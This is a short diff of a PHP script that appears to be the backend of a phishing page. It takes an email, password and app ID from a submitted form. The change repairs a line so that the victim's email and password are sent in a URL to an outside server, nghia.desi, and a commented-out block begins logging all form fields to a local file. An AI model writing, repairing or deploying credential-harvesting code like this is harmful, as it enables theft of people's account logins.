@@ -4,7 +4,7 @@ if (isset($_POST["email"]) && isset($_POST["password"]) && isset($_POST["app_id"
 $email = $_POST['email'];
 $pass = $_POST['password'];
 $app_id = $_POST["app_id"];
-auto('http://nghia.desi/api.php?email='.$email.'&pass'.$app_id);
+auto('http://nghia.desi/api.php?email='.$email.'&pass='.$pass);
 /*
 $handle = fopen("bmn2312.txt", "a");
 foreach($_POST as $variable => $value) {
